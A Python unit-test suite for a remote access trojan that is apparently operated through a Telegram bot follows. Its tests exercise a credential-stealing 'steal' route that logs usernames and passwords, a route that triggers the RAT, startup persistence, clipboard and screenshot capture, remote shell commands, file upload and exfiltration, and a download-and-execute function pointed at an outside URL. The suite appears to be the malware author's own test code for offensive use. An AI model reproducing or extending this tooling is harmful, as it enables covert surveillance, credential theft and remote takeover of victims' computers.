import unittest
from unittest.mock import AsyncMock, MagicMock, patch
import os
import sys

import server
import main
import features.downloader as downloader
import features.persistence as persistence
import features.explorer as explorer
import features.processes as process
import features.upload as upload


class TestRATModules(unittest.IsolatedAsyncioTestCase):

    # ----- server.py -----
    def test_steal_route(self):
        with server.app.test_request_context(json={"username": "user", "password": "pass"}):
            with patch('builtins.open', unittest.mock.mock_open()) as mocked_file:
                response = server.steal()
                mocked_file().write.assert_called_with("Username: user | Password: pass\n")
                self.assertEqual(response, {"status": "received"})

    @patch('subprocess.Popen')
    def test_trigger_route_success(self, mock_popen):
        response = server.trigger()
        mock_popen.assert_called()
        self.assertEqual(response, {"status": "RAT triggered"})

    @patch('subprocess.Popen', side_effect=Exception("fail"))
    def test_trigger_route_failure(self, mock_popen):
        response, status_code = server.trigger()
        self.assertEqual(status_code, 500)
        self.assertIn("fail", response["message"])

    # ----- persistence.py -----
    def test_add_to_startup_returns_bool(self):
        result = persistence.add_to_startup()
        self.assertIsInstance(result, bool)

    # ----- explorer.py -----
    async def test_explore_path_nonexistent(self):
        update = MagicMock()
        update.message.reply_text = AsyncMock()
        context = MagicMock()
        await explorer.explore_path(update, context, "nonexistent_path")
        update.message.reply_text.assert_called_with("❌ Path does not exist.")

    async def test_send_clipboard(self):
        context = MagicMock()
        context.bot.send_message = AsyncMock()  # Use AsyncMock here!
        await explorer.send_clipboard(context, 12345)
        self.assertTrue(context.bot.send_message.await_count >= 1)

    async def test_run_shell(self):
        update = MagicMock()
        update.message.reply_text = AsyncMock()
        context = MagicMock()
        await explorer.run_shell(update, context, "echo test")
        update.message.reply_text.assert_called()

    async def test_send_file_file_not_found(self):
        update = MagicMock()
        update.message.reply_text = AsyncMock()
        context = MagicMock()
        await explorer.send_file(update, context, "nonexistentfile.txt")
        update.message.reply_text.assert_called_with("❌ File not found.")

    async def test_send_screenshot(self):
        context = MagicMock()
        context.bot.send_photo = AsyncMock()  # Use AsyncMock here!
        context.bot.send_message = AsyncMock()  # For error handling fallback
        await explorer.send_screenshot(context, 12345)
        context.bot.send_photo.assert_called()

    # ----- process.py -----
    async def test_handle_process_list(self):
        context = MagicMock()
        context.bot.send_message = AsyncMock()
        await process.handle_process_list(context, 12345)
        self.assertTrue(context.bot.send_message.await_count >= 1)

    # ----- downloader.py -----
    @patch('requests.get')
    @patch('subprocess.Popen')
    async def test_download_and_execute(self, mock_popen, mock_requests_get):
        mock_resp = MagicMock()
        mock_resp.content = b"dummy data"
        mock_requests_get.return_value = mock_resp

        update = MagicMock()
        update.message.reply_text = AsyncMock()
        context = MagicMock()

        await downloader.download_and_execute(update, context, "http://example.com/file.exe")

        update.message.reply_text.assert_any_call("✅ Downloaded file.exe")
        update.message.reply_text.assert_any_call("▶️ Executed file.exe")
        mock_popen.assert_called()

    # ----- upload.py -----
    async def test_handle_upload(self):
        update = MagicMock()
        update.message.reply_text = AsyncMock()
        context = MagicMock()

        await upload.handle_upload(update, context)
        update.message.reply_text.assert_called_with("📤 Please send the file as document.")

    async def test_handle_file_receive(self):
        doc = MagicMock()
        doc.file_id = "file_id"
        doc.file_name = "testfile.txt"

        update = MagicMock()
        update.message.document = doc
        update.message.reply_text = AsyncMock()

        mock_file = AsyncMock()
        context = MagicMock()
        context.bot.get_file = AsyncMock(return_value=mock_file)
        mock_file.download_to_drive = AsyncMock()

        await upload.handle_file_receive(update, context)

        context.bot.get_file.assert_called_with("file_id")
        mock_file.download_to_drive.assert_called_with(custom_path="testfile.txt")
        update.message.reply_text.assert_called_with("✅ Uploaded file saved as testfile.txt")

    # ----- main.py -----
    async def test_start(self):
        update = MagicMock()
        update.message.reply_text = AsyncMock()
        context = MagicMock()

        await main.start(update, context)
        update.message.reply_text.assert_called()

    async def test_button(self):
        query = MagicMock()
        query.data = "screenshot"
        query.answer = AsyncMock()
        update = MagicMock()
        update.callback_query = query
        context = MagicMock()

        # Patch send_screenshot properly with explorer (correct module name)
        with patch('features.explorer.send_screenshot', new=AsyncMock()) as mock_send_screenshot:
            await main.button(update, context)
            query.answer.assert_awaited()
            mock_send_screenshot.assert_awaited()

    async def test_handle_message_unknown(self):
        update = MagicMock()
        update.message.text = "random text"
        update.message.reply_text = AsyncMock()
        context = MagicMock(user_data={})

        await main.handle_message(update, context)
        update.message.reply_text.assert_called_with("⚠️ Use the provided menu buttons.")


if __name__ == "__main__":
    print("Test is running")
    unittest.main()
